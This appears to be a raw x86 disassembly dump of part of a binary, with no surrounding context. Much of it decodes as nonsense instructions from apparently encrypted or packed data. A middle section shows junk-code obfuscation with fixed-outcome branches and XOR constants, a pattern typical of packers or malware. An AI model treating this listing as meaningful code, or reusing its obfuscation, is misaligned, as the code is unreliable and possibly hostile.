  412437:	jns    0x4123df
  412439:	scas   al,BYTE PTR es:[edi]
  41243a:	aaa    
  41243b:	xchg   ebx,eax
  41243c:	push   0xd949dbb9
  412441:	or     al,0xe5
  412443:	ror    DWORD PTR [eax],0x5d
  412446:	inc    edi
  412447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412448:	inc    eax
  412449:	(bad)  
  41244b:	mov    ebx,0xda1c267f
  412450:	sbb    BYTE PTR ds:0x7e3ab0a6,bl
  412456:	pop    ebp
  412457:	mov    al,0x4c
  412459:	(bad)  [ecx+0x5429e91c]
  41245f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412460:	popa   
  412461:	clc    
  412462:	test   dh,0x2
  412465:	stos   DWORD PTR es:[edi],eax
  412466:	ins    DWORD PTR es:[edi],dx
  412467:	add    edi,esi
  412469:	sub    BYTE PTR [esi+0x60],dl
  41246c:	xor    cl,dl
  41246e:	push   ebx
  41246f:	sub    ch,BYTE PTR [ebp-0x74]
  412472:	call   0xdfe7:0x568af593
  412479:	retf   
  41247a:	aad    0x8a
  41247c:	push   cs
  41247d:	inc    eax
  41247e:	or     bh,ch
  412480:	jp     0x41249c
  412482:	dec    esi
  412483:	or     DWORD PTR [ecx+0x51],ebp
  412486:	xchg   esp,eax
  412487:	nop
  412488:	mov    gs,WORD PTR [edi+ebp*2+0x62]
  41248c:	jge    0x41243e
  41248e:	mov    bh,0x68
  412490:	mov    eax,0x3e911768
  412495:	je     0x412433
  412497:	aam    0xff
  412499:	xchg   edx,eax
  41249a:	ret    
  41249b:	es retf 
  41249d:	mov    ebp,0xafceb5b8
  4124a2:	pusha  
  4124a3:	dec    ecx
  4124a4:	mov    dl,0x3a
  4124a6:	mov    ebx,0xda750870
  4124ab:	sbb    al,0x93
  4124ad:	ins    DWORD PTR es:[edi],dx
  4124ae:	add    al,0xe8
  4124b0:	cmp    al,0x86
  4124b2:	xchg   ebp,eax
  4124b3:	nop
  4124b4:	fpatan 
  4124b6:	test   DWORD PTR [ebx+0x18b1a31e],esi
  4124bc:	imul   esi,DWORD PTR [edx],0xd9765bd5
  4124c2:	sahf   
  4124c3:	in     eax,dx
  4124c4:	jo     0x41244a
  4124c6:	mov    ds:0x649c6d85,al
  4124cb:	xor    bh,BYTE PTR [ecx]
  4124cd:	addr16 xchg edi,eax
  4124cf:	stos   DWORD PTR es:[edi],eax
  4124d0:	sar    BYTE PTR [edx+0x29bcbc3a],0x6d
  4124d7:	les    ebx,FWORD PTR [ebx+0x916608c]
  4124dd:	sub    DWORD PTR [eax+0x55689e54],0x5517515
  4124e7:	int3   
  4124e8:	ds lahf 
  4124ea:	int3   
  4124eb:	push   ds
  4124ec:	inc    ebx
  4124ed:	rol    DWORD PTR [eax],0x31
  4124f0:	js     0x4124f4
  4124f2:	fbld   TBYTE PTR [ecx-0x40]
  4124f5:	dec    ecx
  4124f6:	test   al,0x54
  4124f8:	dec    edx
  4124f9:	stc    
  4124fa:	scas   eax,DWORD PTR es:[edi]
  4124fb:	lds    ebp,FWORD PTR [ebp+0x5f]
  4124fe:	or     al,0xb8
  412500:	push   0x20f26928
  412505:	dec    ebx
  412506:	fucomi st,st(6)
  412508:	dec    edi
  412509:	call   FWORD PTR [esi]
  41250b:	lock cld 
  41250d:	hlt    
  41250e:	(bad)  
  41250f:	fiadd  WORD PTR [ebp+0x29800bd4]
  412515:	jle    0x41258d
  412517:	mov    dl,0x2e
  412519:	xchg   edx,ecx
  41251b:	or     ebp,DWORD PTR [edx-0x1a1013df]
  412521:	push   esi
  412522:	fist   DWORD PTR [ebp+0x1fb4361]
  412528:	mov    ah,0xc6
  41252a:	mov    WORD PTR [bp+si+0x54],?
  41252e:	mov    eax,ds:0x491e3d9c
  412533:	loope  0x412563
  412535:	div    DWORD PTR [edi]
  412537:	dec    ebp
  412538:	mov    bl,0xb1
  41253a:	add    al,0x98
  41253c:	sahf   
  41253d:	fisubr DWORD PTR [eax+0x220288a4]
  412543:	lea    eax,[ebp-0x71]
  412546:	inc    edx
  412547:	sub    al,BYTE PTR [edi-0x1dc82a30]
  41254d:	out    dx,al
  41254e:	ss loop 0x41258c
  412551:	data16 add bl,BYTE PTR [ebx+0x5b]
  412555:	pop    ss
  412556:	add    ebx,DWORD PTR [ebp-0x15]
  412559:	out    0x80,eax
  41255b:	or     DWORD PTR [edx+0x7d07d95d],ebx
  412561:	and    ch,dl
  412563:	push   ss
  412564:	mov    ds:0x8bfbd510,al
  412569:	push   edi
  41256a:	add    eax,0xa1a748b0
  41256f:	push   cs
  412570:	jne    0x41256f
  412572:	inc    edx
  412573:	push   ds
  412574:	and    eax,0x416c2b69
  412579:	loop   0x412504
  41257b:	inc    edx
  41257c:	mov    cl,0x64
  41257e:	mov    bh,0x32
  412580:	repnz out dx,al
  412582:	call   0x645edb92
  412587:	aam    0xc4
  412589:	mov    ?,eax
  41258b:	cmp    al,0x30
  41258d:	stc    
  41258e:	repnz xor DWORD PTR [ecx+edi*1-0x51b93eda],eax
  412596:	call   0x76722216
  41259b:	ret    0x603e
  41259e:	cld    
  41259f:	sbb    eax,0x30cee242
  4125a4:	mov    ch,0xff
  4125a6:	push   esp
  4125a7:	mov    dh,dh
  4125a9:	in     eax,0x55
  4125ab:	lea    eax,[edi+0x17b41ea4]
  4125b1:	out    dx,eax
  4125b2:	pushf  
  4125b3:	or     al,dl
  4125b5:	jmp    0x60:0xb5173ea0
  4125bc:	sub    eax,0xc8d192b7
  4125c1:	imul   edi,DWORD PTR [eax],0xffffffe9
  4125c4:	cdq    
  4125c5:	mov    esi,0x49ec6318
  4125ca:	xchg   edx,eax
  4125cb:	xchg   esp,eax
  4125cc:	pushf  
  4125cd:	sub    DWORD PTR [edx],ebp
  4125cf:	hlt    
  4125d0:	mov    ebp,0x1ff473a
  4125d5:	ret    
  4125d6:	and    DWORD PTR [ebx+edi*1-0x303776fa],edi
  4125dd:	sub    DWORD PTR [eax+0x4000b05e],0xd314bf51
  4125e7:	jge    0x41261f
  4125e9:	dec    edi
  4125ea:	mov    ecx,eax
  4125ec:	sbb    BYTE PTR [ebp+0x7f],ah
  4125ef:	fist   DWORD PTR [ebx-0x6b]
  4125f2:	pop    ds
  4125f3:	jl     0x412592
  4125f5:	nop
  4125f6:	scas   eax,DWORD PTR es:[edi]
  4125f7:	pop    edi
  4125f8:	lahf   
  4125f9:	jmp    0xb3e0:0x3b0225ca
  412600:	mul    DWORD PTR [eax-0x702d1e22]
  412606:	hlt    
  412607:	jp     0x4125f3
  412609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41260a:	into   
  41260b:	aas    
  41260c:	pusha  
  41260d:	in     eax,0x63
  41260f:	mov    ecx,0x43847b38
  412614:	sahf   
  412615:	and    esi,DWORD PTR [ecx-0x6dcb72e9]
  41261b:	jmp    0xe74a:0x51a1e666
  412622:	fisub  WORD PTR [ecx+0x8]
  412625:	mov    ecx,0x10d14604
  41262a:	mov    ds:0xe699bcfc,al
  41262f:	add    DWORD PTR [eax+0xf7a4d6d],eax
  412635:	mov    edx,0x32475813
  41263a:	sub    eax,DWORD PTR [edi+edx*1]
  41263d:	adc    BYTE PTR [ebx+0x66],ah
  412640:	or     al,0xeb
  412642:	push   esp
  412643:	and    ebp,edx
  412645:	icebp  
  412646:	gs xchg bl,al
  412649:	test   eax,0xdc3921b9
  41264e:	out    dx,eax
  41264f:	and    BYTE PTR ds:0x70b78bf7,bl
  412655:	pop    esp
  412656:	mov    gs,WORD PTR [eax+0x20361d2c]
  41265c:	nop
  41265d:	inc    edx
  41265e:	pop    esp
  41265f:	inc    edi
  412660:	or     ch,al
  412662:	not    esp
  412664:	in     al,dx
  412665:	add    eax,0x312b067b
  41266a:	mov    bl,0x2d
  41266c:	pop    edx
  41266d:	mov    BYTE PTR [esi-0x51f0794b],dh
  412673:	jnp    0x412633
  412675:	test   eax,0x9135733e
  41267a:	adc    al,0x9e
  41267c:	xor    ch,cl
  41267e:	inc    ebp
  41267f:	mov    eax,0x851bf2f0
  412684:	rol    dl,cl
  412686:	mov    eax,ds:0xf3f37316
  41268b:	lods   eax,DWORD PTR ds:[esi]
  41268c:	push   esi
  41268d:	push   edi
  41268e:	xor    DWORD PTR ds:0x428545,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428341
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x428539
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428555
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x4284bd,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42854d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428559,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x428409
  4126e3:	mov    DWORD PTR ds:0x428359,0x6012
  4126ed:	cmp    DWORD PTR ds:0x4284bd,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428551
  412718:	and    edx,DWORD PTR ds:0x4284f1
  41271e:	mov    DWORD PTR ds:0x428551,edx
  412724:	and    edi,DWORD PTR ds:0x428341
  41272a:	adc    DWORD PTR ds:0x428329,edi
  412730:	add    DWORD PTR ds:0x428561,edi
  412736:	mov    DWORD PTR ds:0x428459,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x428439,0x0
  41274a:	mov    DWORD PTR ds:0x428321,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42844d,0x50a2
  412760:	mov    DWORD PTR ds:0x428421,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428559,0x3c96
  412775:	cmp    DWORD PTR ds:0x428439,0x0
  41277c:	jne    0x41279e
  412782:	push   0x4282a5
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x428421,edi
  412796:	neg    DWORD PTR ds:0x428335
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42835d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x428439,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x428325,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42834d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x428439,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42845d
  4127dc:	mov    edi,DWORD PTR ds:0x42834d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x428439,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428359
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x428415
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x4284d9
  412817:	or     ebx,DWORD PTR ds:0x428431
  41281d:	mov    DWORD PTR ds:0x4284d9,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x428429,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x4284e9,0x0
  412846:	mov    DWORD PTR ds:0x428411,0x17f6
  412850:	mov    DWORD PTR ds:0x428415,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x4284cd
  412862:	cmp    DWORD PTR ds:0x4284e9,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x42840d,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x4283b5
  412886:	mov    edi,DWORD PTR ds:0x428515
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x4284b5,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428545
  4128a3:	sbb    ebx,DWORD PTR ds:0x428555
  4128a9:	cmp    DWORD PTR ds:0x428459,0x0
  4128b0:	mov    DWORD PTR ds:0x4284e5,0x3519
  4128ba:	mov    DWORD PTR ds:0x42855d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x428435
  4128cb:	mov    DWORD PTR ds:0x428351,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428459,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x4284a1
  4128f8:	mov    edi,DWORD PTR ds:0x4285ad
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x428539,ebx
  412909:	add    DWORD PTR ds:0x42854d,edx
  41290f:	sub    edi,DWORD PTR ds:0x4284e9
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428549
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428551,0x0
  412927:	movzx  edx,BYTE PTR ds:0x428401
  41292e:	mov    edi,DWORD PTR ds:0x428441
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x4284dd,0x3a54
  412943:	mov    DWORD PTR ds:0x428335,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428551,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x4284d5,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x428335,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428381
  412997:	mov    edi,DWORD PTR ds:0x42857d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428459,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422578
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x422798
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42848d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x4284cd,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x4284c5
  4129ed:	sbb    DWORD PTR ds:0x428351,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x42832d
  4129fc:	adc    DWORD PTR ds:0x428365,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x428325,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x351390d1
  412a21:	mov    eax,0xbe725ca4
  412a26:	mov    esi,0xbebec4ed
  412a2b:	rcr    BYTE PTR [ebx+0x5e7191a2],0x5e
  412a32:	push   esi
  412a33:	lahf   
  412a34:	jnp    0x412a19
  412a36:	sbb    eax,0xb8e2fc52
  412a3b:	mov    dh,0x2d
  412a3d:	cmp    dl,cl
  412a3f:	adc    esi,edi
  412a41:	fadd   st(0),st
  412a43:	daa    
  412a44:	pop    ebx
  412a45:	pop    edx
  412a46:	xchg   edi,eax
  412a47:	jmp    0xe12a:0x2f14bf75
  412a4e:	aad    0x19
  412a50:	adc    eax,0xde6855b8
  412a55:	push   edx
  412a56:	mov    edi,0x88806da3
  412a5b:	jmp    0x8352f2fa
  412a60:	fwait
  412a61:	loop   0x4129eb
  412a63:	cmc    
  412a64:	push   eax
  412a65:	mov    esi,0xc250500c
  412a6a:	mov    ah,0x3
  412a6c:	add    DWORD PTR [ebp-0x40],0x42
  412a70:	fistp  QWORD PTR [eax+0x30]
  412a73:	out    dx,al
  412a74:	out    0xbb,eax
  412a76:	cli    
  412a77:	dec    ecx
  412a78:	cs cmp dl,cl
  412a7b:	(bad)  
  412a7c:	mov    eax,0xeae3bc99
  412a81:	or     edx,DWORD PTR [eax+0x5b0b2ef9]
  412a87:	adc    DWORD PTR [edx-0x5aa5d65b],ecx
  412a8d:	xor    DWORD PTR [ecx-0x5d70fec7],0x975205b4
  412a97:	nop
  412a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a99:	(bad)  
  412a9a:	xchg   edx,eax
  412a9b:	gs pop ds
  412a9d:	jno    0x412aa3
  412a9f:	inc    eax
  412aa0:	test   BYTE PTR [ebx-0x41],0x74
  412aa4:	or     esi,DWORD PTR [ebp+0x39f8bab5]
  412aaa:	mov    eax,0xa05667bd
  412aaf:	dec    eax
  412ab0:	pusha  
  412ab1:	add    eax,0x6b7e681e
  412ab6:	call   0x4f73:0xc476abde
  412abd:	jno    0x412aef
  412abf:	push   ebp
  412ac0:	cs jnp 0x412b03
  412ac3:	inc    ecx
  412ac4:	aas    
  412ac5:	sub    eax,0xbdd7895e
  412aca:	nop
  412acb:	pop    ebx
  412acc:	sbb    BYTE PTR [esi+0x72],dl
  412acf:	xor    ah,BYTE PTR [ecx+0x2d]
  412ad2:	sahf   
  412ad3:	pop    eax
  412ad4:	lods   al,BYTE PTR ds:[esi]
  412ad5:	lock in al,dx
  412ad7:	mov    dh,0xb4
  412ad9:	pop    ecx
  412ada:	out    dx,al
  412adb:	mov    cl,0x97
  412add:	repz jp 0x412a97
  412ae0:	jp     0x412ac8
  412ae2:	in     eax,0x57
  412ae4:	xor    DWORD PTR [eax+0x74],edi
  412ae7:	in     eax,0xa1
  412ae9:	cmp    dh,BYTE PTR [esi+0x38]
  412aec:	or     cl,bl
  412aee:	mov    eax,ds:0x55e70c70
  412af3:	inc    esi
  412af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af5:	pop    eax
  412af6:	xchg   edi,eax
  412af7:	or     BYTE PTR [eax],al
  412af9:	ins    DWORD PTR es:[edi],dx
  412afa:	nop
  412afb:	sar    DWORD PTR [eax+0x50],0x87
  412aff:	test   eax,0xd4f45278
  412b04:	rcr    DWORD PTR [eax],0x21
  412b07:	hlt    
  412b08:	(bad)  
  412b09:	push   cs
  412b0a:	shr    DWORD PTR [edx-0x20],0x2
  412b0e:	mov    WORD PTR [ecx+edx*4+0x27],?
  412b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b13:	fild   DWORD PTR [edi-0x36]
  412b16:	jnp    0x412b57
  412b18:	inc    eax
  412b19:	mov    bl,0x87
  412b1b:	cs push ebp
  412b1d:	into   
  412b1e:	fwait
  412b1f:	inc    ebp
  412b20:	not    BYTE PTR [ebp+0x7f6d99b]
  412b26:	add    al,0xf8
  412b28:	out    0x81,eax
  412b2a:	imul   ecx,DWORD PTR [ebx+0x39ba3688],0xe1759fed
  412b34:	test   eax,0x560fdca1
  412b39:	outs   dx,BYTE PTR ds:[esi]
  412b3a:	jb     0x412af7
  412b3c:	loope  0x412bb4
  412b3e:	in     al,0x57
  412b40:	push   0xdf3b88a5
  412b45:	pop    es
  412b46:	xchg   ebp,esp
  412b48:	adc    edx,DWORD PTR [ebx]
  412b4a:	mov    edi,0x5cb39807
  412b4f:	mov    ebp,0xcb12bb9d
  412b54:	cdq    
  412b55:	les    edi,FWORD PTR [ecx+eiz*1]
  412b58:	outs   dx,DWORD PTR ds:[esi]
  412b59:	mov    al,ds:0x83808450
  412b5e:	jbe    0x412b41
  412b60:	pop    edx
  412b61:	push   ecx
  412b62:	sbb    edx,edi
  412b64:	fist   DWORD PTR [ebx+0x41]
  412b67:	in     eax,0x31
  412b69:	aas    
  412b6a:	mov    cs,WORD PTR [esi]
  412b6c:	cs push edx
  412b6e:	(bad)  
  412b6f:	repnz sbb ebx,DWORD PTR [edx-0x79fd8826]
  412b76:	jp     0x412b27
  412b78:	cmp    al,0xa0
  412b7a:	or     al,BYTE PTR [edx]
  412b7c:	and    esp,ebx
  412b7e:	rol    cl,1
  412b80:	sar    BYTE PTR [eax-0x41cf102a],0xdd
  412b87:	pop    ds
  412b88:	rcl    BYTE PTR [eax],cl
  412b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b8b:	call   0x988e:0x6bb5ff28
  412b92:	retf   0xd103
  412b95:	mov    dl,0x31
  412b97:	ins    DWORD PTR es:[edi],dx
  412b98:	into   
  412b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b9a:	clc    
  412b9b:	not    DWORD PTR [ecx+0x76]
  412b9e:	adc    DWORD PTR [ebx-0x3d880853],ebp
  412ba4:	rol    BYTE PTR [ebp-0x69cddda1],cl
  412baa:	das    
  412bab:	and    ah,ah
  412bad:	push   edi
  412bae:	mov    dh,0x8a
  412bb0:	mov    bl,0xa2
  412bb2:	and    al,0x68
  412bb4:	inc    esi
  412bb5:	cmp    ecx,edi
  412bb7:	loope  0x412ba5
  412bb9:	pop    es
  412bba:	sub    al,0xd9
  412bbc:	adc    DWORD PTR [edx-0x3e0dec32],0xffffff8e
  412bc3:	lds    ecx,FWORD PTR [esi]
  412bc5:	jmp    0x6fc2:0xfdf527e7
  412bcc:	test   BYTE PTR [eax-0x45],ah
  412bcf:	pop    esp
  412bd0:	mov    ah,0x7a
  412bd2:	adc    BYTE PTR [esi],cl
  412bd4:	icebp  
  412bd5:	mov    eax,0xd1e1cb0f
  412bda:	aam    0x5f
  412bdc:	test   DWORD PTR [edx],esp
  412bde:	adc    BYTE PTR [edi],ch
  412be0:	jl     0x412ba0
  412be2:	add    eax,DWORD PTR [ecx-0x587e355e]
  412be8:	pop    ebp
  412be9:	inc    esp
  412bea:	btr    DWORD PTR [eax],0xde
  412bee:	nop
  412bef:	bound  esp,QWORD PTR [edx+ebp*4]
  412bf2:	les    esi,FWORD PTR [eax+esi*2+0x69]
  412bf6:	sti    
  412bf7:	(bad)  
  412bf8:	mov    esp,0xc3e35dec
  412bfd:	sbb    eax,0x500963e9
  412c02:	iret   
  412c03:	inc    eax
  412c04:	popa   
  412c05:	mov    esp,0x60e07491
  412c0a:	pop    edi
  412c0b:	arpl   WORD PTR [esi],sp
  412c0d:	in     eax,0xc
  412c0f:	sbb    eax,0x3fe36399
  412c14:	mov    bh,0xb9
  412c16:	jnp    0x412c2e
  412c18:	shl    al,cl
  412c1a:	inc    ecx
  412c1b:	mov    edx,0xc39c8230
  412c20:	push   esp
  412c21:	mov    WORD PTR [edx+eax*2],ss
  412c24:	out    dx,eax
  412c25:	mov    ds:0x18f8d770,eax
  412c2a:	pop    ebx
  412c2b:	cmp    DWORD PTR [ebp-0x13],edx
  412c2e:	fwait
  412c2f:	mov    dh,0xdd
  412c31:	in     eax,0x14
  412c33:	adc    ecx,ebp
  412c35:	cli    
  412c36:	arpl   WORD PTR [esi-0x18613454],bp
  412c3c:	xchg   ecx,eax
  412c3d:	mov    esp,0xa73f6d21
  412c42:	pop    ss
  412c43:	xor    ch,BYTE PTR [ebx+0x1e82d5e1]
  412c49:	jmp    0x42d8:0x7f4d0616
  412c50:	repz inc ebx
  412c52:	jmp    0x412bf3
  412c54:	sbb    BYTE PTR [edx-0x225caa71],bh
  412c5a:	cmp    al,0x79
  412c5c:	xor    DWORD PTR [edi-0x56],edi
  412c5f:	xchg   edi,eax
  412c60:	adc    esp,edx
  412c62:	pop    esp
  412c63:	cmp    eax,0x2f66e366
  412c69:	add    ecx,DWORD PTR [ebx-0x17]
  412c6c:	rol    DWORD PTR [esi+0x4a5a8270],0x1a
  412c73:	jg     0x412cf0
  412c75:	mov    dh,0x1d
  412c77:	sti    
  412c78:	dec    edx
  412c79:	iret   
  412c7a:	push   0x4ec452c1
  412c7f:	jb     0x412c38
  412c81:	push   ss
  412c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c83:	stos   DWORD PTR es:[edi],eax
  412c84:	mov    bl,ch
  412c86:	fld    DWORD PTR [ebx]
  412c88:	outs   dx,DWORD PTR ds:[esi]
  412c89:	iret   
  412c8a:	dec    edx
  412c8b:	iret   
  412c8c:	jb     0x412c9e
  412c8e:	js     0x412c82
  412c90:	adc    dl,BYTE PTR [ecx+0x52]
  412c93:	adc    ch,BYTE PTR [esi-0x1346057b]
  412c99:	rcr    DWORD PTR [edx-0x19],cl
  412c9c:	lods   eax,DWORD PTR ds:[esi]
  412c9d:	inc    ecx
  412c9e:	ret    0x93cf
  412ca1:	outs   dx,DWORD PTR ds:[esi]
  412ca2:	iret   
  412ca3:	dec    ebp
  412ca4:	mov    esp,0xfd1c24ca
  412ca9:	ret    0xb0b9
  412cac:	ja     0x412c3a
  412cae:	fistp  DWORD PTR [eax+ebp*1-0x5f]
  412cb2:	jmp    0x412d1e
  412cb4:	xchg   edx,eax
  412cb5:	adc    eax,0xf0fb6f20
  412cba:	jbe    0x412c60
  412cbc:	mov    edi,0x60193cac
  412cc1:	pusha  
  412cc2:	jge    0x412c97
  412cc4:	in     eax,0xb2
  412cc6:	scas   eax,DWORD PTR es:[edi]
  412cc7:	mov    edi,0x2c3356e7
  412ccc:	(bad)  
  412ccd:	sbb    al,0x58
  412ccf:	sub    bh,BYTE PTR [ecx-0x656f0b26]
  412cd5:	scas   eax,DWORD PTR es:[edi]
  412cd6:	arpl   WORD PTR [edx+0x63],ax
  412cd9:	pop    edx
  412cda:	rol    BYTE PTR [esi+0x1e6005a3],cl
  412ce0:	mov    eax,ds:0x28323e8e
  412ce5:	cmc    
  412ce6:	xchg   DWORD PTR [eax+esi*2],esp
  412ce9:	jnp    0x412d00
  412ceb:	sub    eax,DWORD PTR [ebx-0x73]
  412cee:	aam    0x96
  412cf0:	test   DWORD PTR [ecx+0x43],0xa9bba8f1
  412cf7:	jp     0x412cf3
  412cf9:	mov    bh,0x49
  412cfb:	adc    BYTE PTR ds:0x3b4ad2da,bl
  412d01:	sbb    al,0x2c
  412d03:	arpl   bx,bx
  412d05:	mov    ebx,edx
  412d07:	jnp    0x412ca5
  412d09:	dec    esi
  412d0a:	jns    0x412cdf
  412d0c:	retf   0x465f
  412d0f:	push   ebx
  412d10:	inc    edx
  412d11:	sbb    al,0x7a
  412d13:	add    al,0x4
  412d15:	adc    al,bl
  412d17:	(bad)  
  412d18:	cwde   
  412d19:	inc    esi
  412d1a:	bswap  edx
  412d1c:	dec    eax
  412d1d:	lds    ebx,FWORD PTR [eax-0x74]
  412d20:	mov    ds:0x54f554e5,al
  412d25:	(bad)  
  412d26:	hlt    
  412d27:	sub    eax,0xf31a7efe
  412d2c:	mov    dl,0xb9
  412d2e:	bound  eax,QWORD PTR [ebx*8-0xa3904f6]
  412d35:	test   BYTE PTR [esi+0x16],0xe1
  412d39:	jb     0x412cf6
  412d3b:	push   edi
  412d3c:	mov    al,0x1a
  412d3e:	xchg   edi,eax
  412d3f:	inc    ecx
  412d40:	mov    BYTE PTR [ebp-0x4a],al
  412d43:	das    
  412d44:	mov    al,0x47
  412d46:	repz shl eax,0x2
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428455,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x42841d,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428455,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42856d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428549,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
